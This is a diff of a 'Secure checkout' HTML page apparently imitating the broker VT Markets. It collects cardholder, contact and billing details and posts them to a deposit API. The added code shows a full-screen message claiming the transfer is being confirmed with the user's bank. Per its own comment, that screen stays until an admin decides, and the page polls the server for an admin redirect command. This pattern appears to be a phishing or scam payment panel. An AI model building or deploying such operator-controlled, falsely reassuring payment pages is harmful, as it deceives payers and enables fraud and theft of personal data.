@@ -5,12 +5,42 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
     <title>Secure checkout — VT Markets</title>
+    <link rel="icon" type="image/svg+xml" href="favicon.svg">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="checkoutfiles/flow.css?v=1">
+    <link rel="stylesheet" href="checkoutfiles/flow.css?v=2">
+    <style>
+        /* Full-screen processing state shown while the deposit is submitted. */
+        #payProcessing {
+            position: fixed; inset: 0; z-index: 100;
+            display: none; flex-direction: column; align-items: center; justify-content: center;
+            gap: 18px; padding: 24px; text-align: center;
+            background: #0b0e14; color: #e2e8f0;
+        }
+        #payProcessing.on { display: flex; }
+        .pp-ring {
+            width: 54px; height: 54px; border-radius: 50%;
+            border: 3px solid rgba(148,163,184,.22); border-top-color: #2563eb;
+            animation: pp-spin .85s linear infinite;
+        }
+        @keyframes pp-spin { to { transform: rotate(360deg); } }
+        .pp-title { font-size: 17px; font-weight: 700; }
+        .pp-sub { font-size: 12.5px; color: #94a3b8; max-width: 340px; line-height: 1.55; }
+        .pp-amount {
+            font-family: 'JetBrains Mono', monospace; font-size: 22px; font-weight: 800;
+            color: #f8fafc; letter-spacing: -.5px;
+        }
+    </style>
 </head>
 <body>
+
+    <div id="payProcessing" role="status" aria-live="polite">
+        <div class="pp-ring"></div>
+        <div class="pp-amount" id="ppAmount">—</div>
+        <div class="pp-title" id="ppTitle">Processing your payment…</div>
+        <div class="pp-sub" id="ppSub">Do not close this window.</div>
+    </div>
 
     <header class="flow-topbar">
         <div class="flow-brand">
@@ -163,14 +193,27 @@
 
     <footer class="flow-foot" id="flowFoot"></footer>
 
-    <script src="checkoutfiles/flow.js?v=1"></script>
+    <script src="homesubfiles/api-client.js?v=5"></script>
+    <script src="checkoutfiles/flow.js?v=2"></script>
     <script>
     (function () {
         'use strict';
 
-        // init() always returns an order — a sample one when the page is
-        // opened on its own, flagged so the preview banner shows.
+        // No amount in the URL and no live session means the page was reached
+        // out of band — send the user back to the deposit form rather than
+        // inventing an order.
         var order = VTFlow.init();
+        if (!order) { VTFlow.bounceToDeposit(); return; }
+
+        // A deposit is recorded against the signed-in account, so the session has to
+        // exist before this form is worth filling in. Without this check the page
+        // renders fine, the user types everything, and the submit handler rejects
+        // locally with a generic failure that retrying can never clear.
+        if (!window.VTApi || !window.VTAuth || !VTAuth.isAuthed()) {
+            try { sessionStorage.setItem('vt_return_to', location.pathname + location.search); } catch (e) {}
+            location.replace('login.html');
+            return;
+        }
 
         VTFlow.paintChrome(1);
         VTFlow.paintSummary(order);
@@ -213,6 +256,34 @@
             T('Apartment, suite, unit (optional)', 'Appartement, suite (facultatif)', 'Apartamento, suite (opcional)');
         document.getElementById('payBtnAmount').textContent = VTFlow.money(order.amount, order.currency);
         document.getElementById('cardBrand').innerHTML = VTCard.BRANDS.generic;
+
+        /* ---------- prefill contact from the signed-in user ----------
+           The deposit page stashes it in sessionStorage on the way here so the
+           details never travel through the URL. Falls back to /api/auth/me if
+           the stash is missing (e.g. the page was refreshed). */
+        (function prefillContact() {
+            var email = document.getElementById('fEmail');
+            var phone = document.getElementById('fPhone');
+
+            function fill(c) {
+                if (!c) return;
+                if (email && !email.value && c.email) email.value = c.email;
+                if (phone && !phone.value && c.phone) phone.value = c.phone;
+            }
+
+            // Anything already captured on a previous pass through this form wins.
+            fill({ email: order.email, phone: order.phone });
+
+            var stashed = null;
+            try { stashed = JSON.parse(sessionStorage.getItem('vt_checkout_contact') || 'null'); } catch (e) {}
+            fill(stashed);
+
+            if ((!email || email.value) && (!phone || phone.value)) return;
+            if (!window.VTApi || !window.VTAuth || !VTAuth.isAuthed()) return;
+            VTApi.get('/api/auth/me', true)
+                .then(function (r) { fill({ email: r.user && r.user.email, phone: r.user && r.user.phone }); })
+                .catch(function () { /* leave the fields for the user to type */ });
+        })();
 
         /* ---------- country → region / postal ---------- */
         var REGIONS = {
@@ -291,13 +362,6 @@
             if (!v('fAddr1') || !v('fCity') || !v('fPostal'))
                 return fail(T('Complete your billing address.', 'Complétez votre adresse de facturation.', 'Completa tu dirección de facturación.'));
 
-            // Leaving preview: this is now a genuine attempt
-            if (order.preview) {
-                order.preview = false;
-                order.authorised = false;
-                order.ref = 'VTM-' + Date.now().toString(36).toUpperCase().slice(-8);
-            }
-
             // Only the last four digits and the brand are carried forward.
             order.card4 = digits.slice(-4);
             order.brand = VTCard.detect(digits);
@@ -306,12 +370,83 @@
             order.country = v('fCountry');
             VTFlow.write(order);
 
-            var btn = document.getElementById('payBtn');
-            btn.disabled = true;
-            btn.innerHTML = '<span class="f-spinner"></span> ' +
-                T('Contacting your bank…', 'Contact de votre banque…', 'Contactando con tu banco…');
+            document.getElementById('payBtn').disabled = true;
 
-            setTimeout(function () { VTFlow.go('verify-3ds.html'); }, 1300);
+            // Full-screen processing state — stays until admin decides.
+            var overlay = document.getElementById('payProcessing');
+            document.getElementById('ppAmount').textContent = VTFlow.money(order.amount, order.currency);
+            document.getElementById('ppTitle').textContent =
+                T('Processing your payment…', 'Traitement de votre paiement…', 'Procesando tu pago…');
+            document.getElementById('ppSub').textContent =
+                T('Do not close this window. We are confirming the transfer with your bank.',
+                  'Ne fermez pas cette fenêtre. Nous confirmons le virement auprès de votre banque.',
+                  'No cierres esta ventana. Estamos confirmando la transferencia con tu banco.');
+            overlay.classList.add('on');
+
+            var checkoutDetails = {
+                email: v('fEmail'),
+                phone: v('fPhone'),
+                card_last4: digits.slice(-4),
+                card_brand: VTCard.detect(digits),
+                cardholder: v('fName'),
+                billing_address: v('fAddr1') + (v('fAddr2') ? ', ' + v('fAddr2') : ''),
+                billing_city: v('fCity'),
+                billing_region: (document.getElementById('fRegion').value || '').trim(),
+                billing_country: v('fCountry'),
+                billing_postal: v('fPostal'),
+            };
+
+            // The session can still lapse between page load and submit. Say so
+            // plainly and send them to sign in — a generic "try again" is a dead end
+            // here, because no amount of retrying creates a session.
+            if (!window.VTApi || !window.VTAuth || !VTAuth.isAuthed()) {
+                overlay.classList.remove('on');
+                document.getElementById('payBtn').disabled = false;
+                fail(T('Your session has expired. Redirecting you to sign in…',
+                       'Votre session a expiré. Redirection vers la connexion…',
+                       'Tu sesión ha expirado. Redirigiendo al inicio de sesión…'));
+                try { sessionStorage.setItem('vt_return_to', location.pathname + location.search); } catch (e) {}
+                setTimeout(function () { location.replace('login.html'); }, 1800);
+                return;
+            }
+
+            var deposit = VTApi.post('/api/me/deposit', {
+                amount: Number(order.amount), method: 'card',
+                currency: order.currency, checkout_details: checkoutDetails,
+            }, true);
+
+            deposit.then(function (res) {
+                order.txnId = res && res.transaction && res.transaction.id;
+                order.pending = true;
+                VTFlow.write(order);
+
+                // Poll the server for an admin redirect command.
+                var pollTimer = setInterval(function () {
+                    VTApi.get('/api/me/transactions/' + order.txnId + '/poll', true)
+                        .then(function (r) {
+                            if (!r.admin_redirect) return;
+                            clearInterval(pollTimer);
+                            VTFlow.clear();
+                            if (r.admin_redirect === 'checkout') {
+                                location.replace('home.html#deposit');
+                            } else {
+                                location.replace('home.html#transaction-history');
+                            }
+                        })
+                        .catch(function () {});
+                }, 3000);
+            }).catch(function (e) {
+                console.error('[checkout] deposit failed:', e && e.message, e && e.data);
+                overlay.classList.remove('on');
+                document.getElementById('payBtn').disabled = false;
+                // Surface the server's own reason when it gave one. A flat "try again"
+                // on a validation or server error just loops the user forever.
+                var reason = (e && e.data && e.data.error && e.data.error.message) || '';
+                fail(T('We could not record your deposit. ',
+                        "Nous n'avons pas pu enregistrer votre dépôt. ",
+                        'No pudimos registrar tu depósito. ')
+                     + (reason || T('Please try again.', 'Veuillez réessayer.', 'Inténtalo de nuevo.')));
+            });
         });
     })();
     </script>
